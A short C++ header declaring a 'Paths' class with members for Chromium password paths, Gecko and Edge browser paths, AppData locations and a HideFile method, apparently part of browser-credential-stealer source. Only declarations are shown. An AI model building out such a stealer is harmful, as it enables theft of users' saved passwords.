#pragma once
#include <vector>
#include <string>
//#include "StringsCrypt.h"

class Paths
{
public:
    static std::string GetFolderPath(int folder);
    static std::string InitWorkDir();
    static void HideFile(std::string path);
    static std::vector <std::string > SChromiumPswPaths;
    static std::vector <std::string > SGeckoBrowserPaths;
    static std::vector <std::string > EdgePath;
    // Appdata
    static std::string Appdata;
    static std::string Lappdata;

};
